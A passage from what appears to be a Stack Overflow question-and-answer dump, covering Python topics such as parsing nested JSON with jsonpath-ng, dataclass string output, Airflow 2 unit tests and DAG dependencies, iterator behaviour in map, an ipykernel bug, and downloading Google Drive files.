{&quot;time_weighted_return&quot;: -0.06154960593668424, &quot;time_weighted_return_2&quot;: -0.06154960593668424, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 1191838.9399999995}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10643052, &quot;name&quot;: &quot;2013 Irrev Tr HBO Thalia&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.06750460387418267, &quot;time_weighted_return_2&quot;: -0.06750460387418267, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 4416618.520000002}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10598341, &quot;name&quot;: &quot;Cht 11th Tr HBO Shirley&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.05604507809250081, &quot;time_weighted_return_2&quot;: -0.05604507809250081, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 38190.33}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10598337, &quot;name&quot;: &quot;Cht 11th Tr HBO Hannah&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.05604507809250081, &quot;time_weighted_return_2&quot;: -0.05604507809250081, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 37940.72}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10598334, &quot;name&quot;: &quot;Cht 11th Tr HBO Lau&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.05604507809250081, &quot;time_weighted_return_2&quot;: -0.05604507809250081, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 37940.72}, &quot;children&quot;: []}]}, {&quot;name&quot;: &quot;Asset Class E&quot;, &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.017118805423322003, &quot;time_weighted_return_2&quot;: -0.017118805423322003, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 3148495.0914600003}, &quot;children&quot;: [{&quot;entity_id&quot;: 10868778, &quot;name&quot;: &quot;2012 Desc Tr HBO Thalia&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.015251157805867277, &quot;time_weighted_return_2&quot;: -0.015251157805867277, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 800493.06146}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10643052, &quot;name&quot;: &quot;2013 Irrev Tr HBO Thalia&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.01739609576880241, &quot;time_weighted_return_2&quot;: -0.01739609576880241, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 2215511.2700000005}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10598341, &quot;name&quot;: &quot;Cht 11th Tr HBO Shirley&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.02085132265594647, &quot;time_weighted_return_2&quot;: -0.02085132265594647, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 44031.21}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10598337, &quot;name&quot;: &quot;Cht 11th Tr HBO Hannah&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.02089393244695803, &quot;time_weighted_return_2&quot;: -0.02089393244695803, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 44394.159999999996}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10598334, &quot;name&quot;: &quot;Cht 11th Tr HBO Lau&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.020607507059866248, &quot;time_weighted_return_2&quot;: -0.020607507059866248, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 44065.39000000001}, &quot;children&quot;: []}]}, {&quot;name&quot;: &quot;Asset Class F&quot;, &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.0014710489231547497, &quot;time_weighted_return_2&quot;: -0.0014710489231547497, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 198260.12}, &quot;children&quot;: [{&quot;entity_id&quot;: 10868778, &quot;name&quot;: &quot;2012 Desc Tr HBO Thalia&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.0014477244560456848, &quot;time_weighted_return_2&quot;: -0.0014477244560456848, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 44612.33}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10643052, &quot;name&quot;: &quot;2013 Irrev Tr HBO Thalia&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.001477821083437858, &quot;time_weighted_return_2&quot;: -0.001477821083437858, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 153647.78999999998}, &quot;children&quot;: []}]}]}]}]}}, &quot;included&quot;: []}}')

df = unpack_response(api_response)
</code></pre>
<h2>Explanation:</h2>
<p>Firstly, you can confirm the expected output by the following command:</p>
<pre class=""lang-py prettyprint-override""><code>print(df.iloc[:5:,1:])
</code></pre>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th style=""text-align: center;"">portfolio</th>
<th style=""text-align: center;"">name</th>
<th style=""text-align: center;"">entity_id</th>
<th style=""text-align: center;"">Adjusted Value (No Div, USD)</th>
<th style=""text-align: center;"">Current Quarter TWR (USD)</th>
<th style=""text-align: center;"">YTD TWR (USD)</th>
<th style=""text-align: center;"">TWR Audit Note</th>
</tr>
</thead>
<tbody>
<tr>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">nan</td>
<td style=""text-align: center;"">2.31325e+07</td>
<td style=""text-align: center;"">-0.0467323</td>
<td style=""text-align: center;"">-0.0467323</td>
<td style=""text-align: center;""></td>
</tr>
<tr>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">Wealth Bucket A</td>
<td style=""text-align: center;"">nan</td>
<td style=""text-align: center;"">1.32644e+07</td>
<td style=""text-align: center;"">-0.0459603</td>
<td style=""text-align: center;"">-0.0459603</td>
<td style=""text-align: center;""></td>
</tr>
<tr>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">Asset Class A</td>
<td style=""text-align: center;"">nan</td>
<td style=""text-align: center;"">3337.99</td>
<td style=""text-align: center;"">3.43409e-06</td>
<td style=""text-align: center;"">3.43409e-06</td>
<td style=""text-align: center;""></td>
</tr>
<tr>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">HUDJ Trust</td>
<td style=""text-align: center;"">1.06045e+07</td>
<td style=""text-align: center;"">3337.99</td>
<td style=""text-align: center;"">3.43409e-06</td>
<td style=""text-align: center;"">3.43409e-06</td>
<td style=""text-align: center;""></td>
</tr>
<tr>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">Asset Class B</td>
<td style=""text-align: center;"">nan</td>
<td style=""text-align: center;"">1.017e+06</td>
<td style=""text-align: center;"">-0.0258713</td>
<td style=""text-align: center;"">-0.0258713</td>
<td style=""text-align: center;""></td>
</tr>
</tbody>
</table>
</div>
<p>Subsequently, you can see one of the wonderful features in <code>jsonpath-ng</code> by the following command:</p>
<pre class=""lang-py prettyprint-override""><code>print(df.iloc[:10,:3])
</code></pre>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th style=""text-align: left;"">full_path</th>
<th style=""text-align: center;"">portfolio</th>
<th style=""text-align: center;"">name</th>
</tr>
</thead>
<tbody>
<tr>
<td style=""text-align: left;"">data.attributes.total.children.[0]</td>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">Falconer Family</td>
</tr>
<tr>
<td style=""text-align: left;"">data.attributes.total.children.[0].children.[0]</td>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">Wealth Bucket A</td>
</tr>
<tr>
<td style=""text-align: left;"">data.attributes.total.children.[0].children.[0].children.[0]</td>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">Asset Class A</td>
</tr>
<tr>
<td style=""text-align: left;"">data.attributes.total.children.[0].children.[0].children.[0].children.[0]</td>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">HUDJ Trust</td>
</tr>
<tr>
<td style=""text-align: left;"">data.attributes.total.children.[0].children.[0].children.[1]</td>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">Asset Class B</td>
</tr>
<tr>
<td style=""text-align: left;"">data.attributes.total.children.[0].children.[0].children.[1].children.[0]</td>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">HUDG Trust</td>
</tr>
<tr>
<td style=""text-align: left;"">data.attributes.total.children.[0].children.[0].children.[2]</td>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">Asset Class C</td>
</tr>
<tr>
<td style=""text-align: left;"">data.attributes.total.children.[0].children.[0].children.[2].children.[0]</td>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">HKDJ Trust</td>
</tr>
<tr>
<td style=""text-align: left;"">data.attributes.total.children.[0].children.[0].children.[3]</td>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">Asset Class D</td>
</tr>
<tr>
<td style=""text-align: left;"">data.attributes.total.children.[0].children.[0].children.[3].children.[0]</td>
<td style=""text-align: center;"">Falconer Family</td>
<td style=""text-align: center;"">HUDW Trust</td>
</tr>
</tbody>
</table>
</div>
<p>Thanks to the <code>full_path</code> column, you can grasp the nesting level of the extracted data in each row instantaneously. Actually, I appended the correct <code>portfolio</code> values by using these paths.</p>
<p>In terms of the code, the key point is the following line:</p>
<pre class=""lang-py prettyprint-override""><code>expr = jp.parse('$..children.[*]')
</code></pre>
<p>By the above expression, you can search the <code>children</code> attributes at any level of the json object. <a href=""https://github.com/h2non/jsonpath-ng/blob/master/README.rst"" rel=""nofollow noreferrer"">README.rst</a> tells you what each syntax stands for.</p>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th style=""text-align: center;"">Syntax</th>
<th style=""text-align: center;"">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style=""text-align: center;""><code>$</code></td>
<td style=""text-align: center;"">The root object</td>
</tr>
<tr>
<td style=""text-align: center;""><code>jsonpath1 .. jsonpath2</code></td>
<td style=""text-align: center;"">All nodes matched by jsonpath2 that descend from any node matching jsonpath1</td>
</tr>
<tr>
<td style=""text-align: center;""><code>[*]</code></td>
<td style=""text-align: center;"">any array index</td>
</tr>
</tbody>
</table>
</div><h2>Speed:</h2>
<p>I compared the speed between the above method with <code>jsonpath-ng</code> and a nested-for-loop method shown below.</p>
<h4># Comparison:</h4>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th style=""text-align: center;"">Method</th>
<th style=""text-align: center;"">Duration</th>
<th style=""text-align: center;"">Speed ratio</th>
</tr>
</thead>
<tbody>
<tr>
<td style=""text-align: center;""><code>jsonpath-ng</code></td>
<td style=""text-align: center;"">9.72 ms ± 342 µs per loop (mean ± std. dev. of 7 runs, 100 loops each)</td>
<td style=""text-align: center;"">5.7 (faster)</td>
</tr>
<tr>
<td style=""text-align: center;"">Nested-for-loop</td>
<td style=""text-align: center;"">55.4 ms ± 7.39 ms per loop (mean ± std. dev. of 7 runs, 10 loops each)</td>
<td style=""text-align: center;"">1</td>
</tr>
</tbody>
</table>
</div><h4># Code of the nested-for-loop method:</h4>
<pre class=""lang-py prettyprint-override""><code>def unpack_response(r):
    df = pd.DataFrame()
    for _, r1 in pd.json_normalize(r, ['data', 'attributes', 'total', 'children']).iterrows(): 
        r1['portfolio'] = r1['name']
        df = df.append(r1)
        for _, r2 in pd.json_normalize(r1.children).iterrows(): 
            df = df.append(r2)
            for _, r3 in pd.json_normalize(r2.children).iterrows(): 
                df = df.append(r3).append(pd.json_normalize(r3.children))
    df['portfolio'].fillna(method='ffill', inplace=True)
    trans = {'columns.' + c['key']: c['display_name'] for c in r['meta']['columns']}
    cols = ['portfolio', 'name', 'entity_id', 'Adjusted Value (No Div, USD)', 'Current Quarter TWR (USD)', 'YTD TWR (USD)', 'TWR Audit Note']
    df = df.rename(columns=trans)[cols].reset_index(drop=True)
    return df
</code></pre>
"
"71344648","1","How to define `__str__` for `dataclass` that omits default values?","<p>Given a <code>dataclass</code> instance, I would like <code>print()</code> or <code>str()</code> to only list the non-default field values.  This is useful when the <code>dataclass</code> has many fields and only a few are changed.</p>
<pre><code>@dataclasses.dataclass
class X:
  a: int = 1
  b: bool = False
  c: float = 2.0

x = X(b=True)
print(x)  # Desired output: X(b=True)
</code></pre>
","71344649","<p>The solution is to add a custom <code>__str__()</code> function:</p>
<pre><code>@dataclasses.dataclass
class X:
  a: int = 1
  b: bool = False
  c: float = 2.0

  def __str__(self):
    &quot;&quot;&quot;Returns a string containing only the non-default field values.&quot;&quot;&quot;
    s = ', '.join(f'{field.name}={getattr(self, field.name)!r}'
                  for field in dataclasses.fields(self)
                  if getattr(self, field.name) != field.default)
    return f'{type(self).__name__}({s})'

x = X(b=True)
print(x)        # X(b=True)
print(str(x))   # X(b=True)
print(repr(x))  # X(a=1, b=True, c=2.0)
print(f'{x}, {x!s}, {x!r}')  # X(b=True), X(b=True), X(a=1, b=True, c=2.0)
</code></pre>
<hr />
<p>This can also be achieved using a decorator:</p>
<pre><code>def terse_str(cls):  # Decorator for class.
  def __str__(self):
    &quot;&quot;&quot;Returns a string containing only the non-default field values.&quot;&quot;&quot;
    s = ', '.join(f'{field.name}={getattr(self, field.name)}'
                  for field in dataclasses.fields(self)
                  if getattr(self, field.name) != field.default)
    return f'{type(self).__name__}({s})'

  setattr(cls, '__str__', __str__)
  return cls

@dataclasses.dataclass
@terse_str
class X:
  a: int = 1
  b: bool = False
  c: float = 2.0
</code></pre>
"
"71221412","1","Dag run not found when unit testing a custom operator in Airflow","<p>I've written a custom operator (DataCleaningOperator), which corrects JSON data based on a provided schema.</p>
<p>The unit tests previously worked when I didn't have to instatiate a TaskInstance and provide the operator with a context. However, I've updated the operator recently to take in a context (so that it can use xcom_push).</p>
<p>Here is an example of one of the tests:</p>
<pre><code>DEFAULT_DATE = datetime.today()

class TestDataCleaningOperator(unittest.TestCase):    
    &quot;&quot;&quot;
    Class to execute unit tests for the operator 'DataCleaningOperator'.
    &quot;&quot;&quot;
    def setUp(self) -&gt; None:
        super().setUp()
        self.dag = DAG(
            dag_id=&quot;test_dag_data_cleaning&quot;,
            schedule_interval=None,
            default_args={
                &quot;owner&quot;: &quot;airflow&quot;,
                &quot;start_date&quot;: DEFAULT_DATE,
                &quot;output_to_xcom&quot;: True,
            },
        )
        self._initialise_test_data()

    def _initialize_test_data() -&gt; None:
        # Test data set here as class variables such as self.test_data_correct
        ...

    def test_operator_cleans_dataset_which_matches_schema(self) -&gt; None:
        &quot;&quot;&quot;
        Test: Attempt to clean a dataset which matches the provided schema.
        Verification: Returns the original dataset, unchanged.
        &quot;&quot;&quot;
        task = DataCleaningOperator(
            task_id=&quot;test_operator_cleans_dataset_which_matches_schema&quot;,
            schema_fields=self.test_schema_nest,
            data_file_object=deepcopy(self.test_data_correct),
            dag=self.dag,
        )
        ti = TaskInstance(task=task, execution_date=DEFAULT_DATE)
        result: List[dict] = task.execute(ti.get_template_context())
        self.assertEqual(result, self.test_data_correct)
</code></pre>
<p>However, when the tests are run, the following error is raised:</p>
<pre><code>airflow.exceptions.DagRunNotFound: DagRun for 'test_dag_data_cleaning' with date 2022-02-22 12:09:51.538954+00:00 not found
</code></pre>
<p>This is related to the line in which a task instance is instantiated in test_operator_cleans_dataset_which_matches_schema.</p>
<p>Why can't Airflow locate the test_dag_data_cleaning DAG? Is there a specific configuration I've missed? Do I need to also create a DAG run instance or add the DAG to the dag bag manually if this test dag is outide of my standard DAG directory? All normal (non-test) dags in my dag dir run correctly.</p>
<p>In case it helps, my current Airflow version is 2.2.3 and the structure of my project is:</p>
<pre><code>airflow
├─ dags
├─ plugins
|  ├─ ...
|  └─ operators
|     ├─ ...
|     └─ data_cleaning_operator.py
|
└─ tests
   ├─ ...
   └─ operators
      └─ test_data_cleaning_operator.py
</code></pre>
","71346981","<p>The code have written is using <a href=""https://airflow.apache.org/docs/apache-airflow/2.0.0/best-practices.html#unit-tests"" rel=""noreferrer"">Airflow 2.0 format of unit test</a>. So when you upgraded to <a href=""https://airflow.apache.org/docs/apache-airflow/2.2.3/best-practices.html#unit-tests"" rel=""noreferrer"">Airflow 2.2.3, the unit test</a> requires you to create a dagrun before you create a test run.</p>
<p>Below is the sample code which worked for me:</p>
<pre><code>import unittest

import pendulum
from airflow import DAG
from airflow.utils.state import DagRunState
from airflow.utils.types import DagRunType

from operators.test_operator import EvenNumberCheckOperator

DEFAULT_DATE = pendulum.datetime(2022, 3, 4, tz='America/Toronto')
TEST_DAG_ID = &quot;my_custom_operator_dag&quot;
TEST_TASK_ID = &quot;my_custom_operator_task&quot;


class TestEvenNumberCheckOperator(unittest.TestCase):

    def setUp(self):
        super().setUp()
        self.dag = DAG('test_dag4', default_args={'owner': 'airflow', 'start_date': DEFAULT_DATE})
        self.even = 10
        self.odd = 11
        EvenNumberCheckOperator(
            task_id=TEST_TASK_ID,
            my_operator_param=self.even,
            dag=self.dag
        )


    def test_even(self):
        &quot;&quot;&quot;Tests that the EvenNumberCheckOperator returns True for 10.&quot;&quot;&quot;
        dagrun = self.dag.create_dagrun(state=DagRunState.RUNNING,
                                        execution_date=DEFAULT_DATE,
                                        #data_interval=DEFAULT_DATE,
                                        start_date=DEFAULT_DATE,
                                        run_type=DagRunType.MANUAL)
        ti = dagrun.get_task_instance(task_id=TEST_TASK_ID)
        ti.task = self.dag.get_task(task_id=TEST_TASK_ID)
        result = ti.task.execute(ti.get_template_context())
        assert result is True
</code></pre>
"
"71099818","1","WebSocket not working when trying to send generated answer by keras","<p>I am implementing a simple chatbot using keras and WebSockets. I now have a model that can make a prediction about the user input and send the according answer.</p>
<p>When I do it through command line it works fine, however when I try to send the answer through my WebSocket, the WebSocket doesn't even start anymore.</p>
<p>Here is my working WebSocket code:</p>
<pre><code>@sock.route('/api')
def echo(sock):
    while True:
        # get user input from browser
        user_input = sock.receive()
        # print user input on console
        print(user_input)
        # read answer from console
        response = input()
        # send response to browser
        sock.send(response)
</code></pre>
<p>Here is my code to communicate with the keras model on command line:</p>
<pre><code>while True:
    question = input(&quot;&quot;)
    ints = predict(question)
    answer = response(ints, json_data)
    print(answer)
</code></pre>
<p>Used methods are those:</p>
<pre><code>def predict(sentence):
    bag_of_words = convert_sentence_in_bag_of_words(sentence)
    # pass bag as list and get index 0
    prediction = model.predict(np.array([bag_of_words]))[0]
    ERROR_THRESHOLD = 0.25
    accepted_results = [[tag, probability] for tag, probability in enumerate(prediction) if probability &gt; ERROR_THRESHOLD]

    accepted_results.sort(key=lambda x: x[1], reverse=True)

    output = []
    for accepted_result in accepted_results:
        output.append({'intent': classes[accepted_result[0]], 'probability': str(accepted_result[1])})
        print(output)
    return output


def response(intents, json):
    tag = intents[0]['intent']
    intents_as_list = json['intents']
    for i in intents_as_list:
        if i['tag'] == tag:
            res = random.choice(i['responses'])
            break
    return res
</code></pre>
<p>So when I start the WebSocket with the working code I get this output:</p>
<pre><code> * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
 * Restarting with stat
 * Serving Flask app 'server' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
</code></pre>
<p>But as soon as I have anything of my model in the <code>server.py</code> class I get this output:</p>
<pre><code>2022-02-13 11:31:38.887640: I tensorflow/core/common_runtime/pluggable_device/pluggable_device_factory.cc:305] Could not identify NUMA node of platform GPU ID 0, defaulting to 0. Your kernel may not have been built with NUMA support.
2022-02-13 11:31:38.887734: I tensorflow/core/common_runtime/pluggable_device/pluggable_device_factory.cc:271] Created TensorFlow device (/job:localhost/replica:0/task:0/device:GPU:0 with 0 MB memory) -&gt; physical PluggableDevice (device: 0, name: METAL, pci bus id: &lt;undefined&gt;)
Metal device set to: Apple M1

systemMemory: 16.00 GB
maxCacheSize: 5.33 GB
</code></pre>
<p>It is enough when I just have an import at the top like this: <code>from chatty import response, predict</code> - even though they are unused.</p>
","71158506","<p>I am devastated, I just wasted 2 days into the dumbest possible issue (and fix)</p>
<p>I still had the</p>
<pre><code>while True:
    question = input(&quot;&quot;)
    ints = predict(question)
    answer = response(ints, json_data)
    print(answer)
</code></pre>
<p>in my model file, so the server didn't start. The fix was to delete it and now it works fine.</p>
"
"71324369","1","Does time complexity change when two nested loops are re-written into a single loop?","<p>Is the time complexity of nested for, while, and if statements the same? Suppose <code>a</code> is given as an array of length <code>n</code>.</p>
<pre><code>for _ in range(len(a)):
    for _ in range(len(a)):
        do_something
</code></pre>
<p>The for statement above will be O(n²).</p>
<pre><code>i = 0
while i &lt; len(a) * len(a):
    do_something
    i += 1
</code></pre>
<p>At first glance, the above loop can be thought of as O(n), but in the end I think that it is also O(n²).</p>
<p>Am I right?</p>
","71324413","<blockquote>
<p>Am I right?</p>
</blockquote>
<p>Yes!</p>
<p>The double loop:</p>
<pre><code>for _ in range(len(a)):
    for _ in range(len(a)):
        do_something
</code></pre>
<p>has a time complexity of O(n) * O(n) = O(n²) because each loop runs until <code>n</code>.</p>
<p>The single loop:</p>
<pre><code>i = 0
while i &lt; len(a) * len(a):
    do_something
    i += 1
</code></pre>
<p>has a time complexity of O(n * n) = O(n²), because the loop runs until <code>i = n * n = n²</code>.</p>
"
"71116130","1","iPyKernel throwing ""TypeError: object NoneType can't be used in 'await' expression""","<p>I know that several similar questions exist on this topic, but to my knowledge all of them concern an <code>async</code> code (wrongly) written by the user, while in my case it comes from a Python package.</p>
<p>I have a Jupyter notebook whose first cell is</p>
<pre><code>! pip install numpy
! pip install pandas
</code></pre>
<p>and I want to automatically play the notebook using Papermill. No problem on my local machine (Windows 11 with Python 3.7): I install iPyKernel and Papermill and everything is fine.</p>
<p>The problem is when I try to do the same on my BitBucket pipeline (Python image <code>3-alpine</code>, but it happens under different others); the first cell throws the following error:</p>
<pre><code>Traceback (most recent call last):
  File &quot;/usr/local/lib/python3.7/site-packages/ipykernel/kernelbase.py&quot;, line 461, in dispatch_queue
    await self.process_one()
  File &quot;/usr/local/lib/python3.7/site-packages/ipykernel/kernelbase.py&quot;, line 450, in process_one
    await dispatch(*args)
TypeError: object NoneType can't be used in 'await' expression
</code></pre>
<p>that makes the script stop at the 2nd cell, where I <code>import numpy</code>.</p>
<p>If it can be relevant, I've &quot;papermilled&quot; under the GitLab CI without any problem in the past.</p>
","71218064","<p>Seems to be a bug in <code>ipykernel 6.9.0</code> - options that worked for me:</p>
<ul>
<li>upgrade to <code>6.9.1</code> (latest version as of 2022-02-22); e.g. via <code>pip install ipykernel --upgrade</code></li>
<li>downgrade to <code>6.8.0</code> (if upgrading messes with other dependencies you might have); e.g. via <code>pip install ipykernel==6.8.0</code></li>
</ul>
"
"71228643","1","MWAA Airflow 2.2.2 'DAG' object has no attribute 'update_relative'","<p>So I was upgrading DAGs from airflow version 1.12.15 to 2.2.2 and DOWNGRADING python from 3.8 to 3.7 (since MWAA doesn't support python 3.8). The DAG is working fine on the previous setup but shows this error on the MWAA setup:</p>
<pre><code>Broken DAG: [/usr/local/airflow/dags/google_analytics_import.py] Traceback (most recent call last):
  File &quot;/usr/local/lib/python3.7/site-packages/airflow/models/baseoperator.py&quot;, line 1474, in set_downstream
    self._set_relatives(task_or_task_list, upstream=False, edge_modifier=edge_modifier)
  File &quot;/usr/local/lib/python3.7/site-packages/airflow/models/baseoperator.py&quot;, line 1412, in _set_relatives
    task_object.update_relative(self, not upstream)
AttributeError: 'DAG' object has no attribute 'update_relative'
</code></pre>
<p>This is the built-in function that seems to be failing:</p>
<pre><code>
def set_downstream(
        self,
        task_or_task_list: Union[TaskMixin, Sequence[TaskMixin]],
        edge_modifier: Optional[EdgeModifier] = None,
    ) -&gt; None:
        &quot;&quot;&quot;
        Set a task or a task list to be directly downstream from the current
        task. Required by TaskMixin.
        &quot;&quot;&quot;
        self._set_relatives(task_or_task_list, upstream=False, edge_modifier=edge_modifier)
</code></pre>
<p>There is the code we are trying to run in the DAG:</p>
<pre><code>    for report in reports:
        dag &lt;&lt; PythonOperator(
            task_id=f&quot;task_{report}&quot;,
            python_callable=process,
            op_kwargs={
                &quot;conn&quot;: &quot;snowflake_production&quot;,
                &quot;table&quot;: report,
            },
            provide_context=True,
        )
</code></pre>
<p>I am thinking this transition from Python 3.8 to 3.7 is causing this issue but I am not sure.</p>
<p>Did anyone run across a similar issue ?</p>
","71234167","<p>For Airflow&gt;=2.0.0 Assigning task to a DAG using bitwise shift (bit-shift) operators are no longer supported.</p>
<p>Trying to do:</p>
<pre><code>dag = DAG(&quot;my_dag&quot;)
dummy = DummyOperator(task_id=&quot;dummy&quot;)

dag &gt;&gt; dummy
</code></pre>
<p>Will not work.</p>
<p>Dependencies should be set only between operators.</p>
<p>You should use context manager:</p>
<pre><code>with DAG(&quot;my_dag&quot;) as dag:
    dummy = DummyOperator(task_id=&quot;dummy&quot;)
</code></pre>
<p>It already handles the relations of operator to DAG object.
If you prefer not to, then use the dag parameter in the operator constructor as: <code>DummyOperator(task_id=&quot;dummy&quot;, dag=dag)</code></p>
"
"71351209","1","Why does `map` hide a `StopIteration`?","<p>I found a case when <code>map()</code> usage isn't equivalent to a list comprehension. It happens when <code>next</code> used as the first argument.</p>
<p>For example:</p>
<pre class=""lang-py prettyprint-override""><code>l1 = [1, 2]
l2 = ['hello', 'world']
iterators = [iter(l1), iter(l2)]

# list comprehension
values1 = [next(it) for it in iterators]
# values1 = [1, &quot;hello&quot;]
values2 = [next(it) for it in iterators]
# values2 = [2, &quot;world&quot;]
values3 = [next(it) for it in iterators]
# raise StopIteration
</code></pre>
<pre class=""lang-py prettyprint-override""><code>l1 = [1, 2]
l2 = ['hello', 'world']
iterators = [iter(l1), iter(l2)]

# map
values1 = list(map(next, iterators))
# values1 = [1, &quot;hello&quot;]
values2 = list(map(next, iterators))
# values2 = [2, &quot;world&quot;]
values3 = list(map(next, iterators))
# values3 = []
# doesn't raise StopIteration
</code></pre>
<p>Any other exceptions occur as they should.
Example:</p>
<pre class=""lang-py prettyprint-override""><code>def divide_by_zero(value: int):
    return value // 0

l = [1, 2, 3]
values = list(map(divide_by_zero, l))
# raises ZeroDivisionError as expected
values = [divide_by_zero(value) for value in l]
# raises ZeroDivisionError as expected, too
</code></pre>
<p>It seems very strange. It works the same with Python 3.9 and Python 3.11.</p>
<p>It seems like <code>map()</code> works like this:</p>
<pre class=""lang-py prettyprint-override""><code>def map(func, iterator):
    try:
        while True:
            item = next(iterator)
            yield func(item)
    except StopIteration:
        pass
</code></pre>
<p>but I expected it to work like this:</p>
<pre class=""lang-py prettyprint-override""><code>def map(func, iterator):
    while True:
        try:
            item = next(iterator)
        except StopIteration:
            break
        yield func(item)
</code></pre>
<p>Is it a bug?</p>
","71351332","<p>Try calling <code>next</code> on <code>map</code>:</p>
<pre><code>&gt;&gt;&gt; &gt;&gt;&gt; m = map(next, iterators)
&gt;&gt;&gt; next(m)
1
&gt;&gt;&gt; next(m)
'hello'
&gt;&gt;&gt; next(m)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
StopIteration
</code></pre>
<p>It's <code>list</code> that sees <code>StopIteration</code> and uses it to stop building the list from what <code>map</code> yields.</p>
<p>The list comprehension, on the other hand, is building the list by iterating over <code>iterators</code>, not a particular iterator in <em>that</em> list. That is, <code>next(it)</code> is used to produce a <em>value</em> for the list, not to determine if we've reached the end of <code>iterators</code>.</p>
"
"71343002","1","Downloading files from public Google Drive in python: scoping issues?","<p>Using my answer to <a href=""https://stackoverflow.com/questions/68270332/automatically-download-large-files-in-public-gdrive-folder"">my question</a> on how to download files from a public Google drive I managed in the past to download images using their IDs from a python script and Google API v3 from a public drive using the following bock of code:</p>
<pre class=""lang-py prettyprint-override""><code>from google_auth_oauthlib.flow import Flow, InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload, MediaIoBaseDownload
from google.auth.transport.requests import Request
import io
import re
SCOPES = ['https://www.googleapis.com/auth/drive']
CLIENT_SECRET_FILE = &quot;myjson.json&quot;
authorized_port = 6006 # authorize URI redirect on the console
flow = InstalledAppFlow.from_client_secrets_file(CLIENT_SECRET_FILE, SCOPES)
cred = flow.run_local_server(port=authorized_port)
drive_service = build(&quot;drive&quot;, &quot;v3&quot;, credentials=cred)
regex = &quot;(?&lt;=https://drive.google.com/file/d/)[a-zA-Z0-9]+&quot;
for i, l in enumerate(links_to_download):
    url = l
    file_id = re.search(regex, url)[0]
    request = drive_service.files().get_media(fileId=file_id)
    fh = io.FileIO(f&quot;file_{i}&quot;, mode='wb')
    downloader = MediaIoBaseDownload(fh, request)
    done = False
    while done is False:
        status, done = downloader.next_chunk()
        print(&quot;Download %d%%.&quot; % int(status.progress() * 100))
</code></pre>
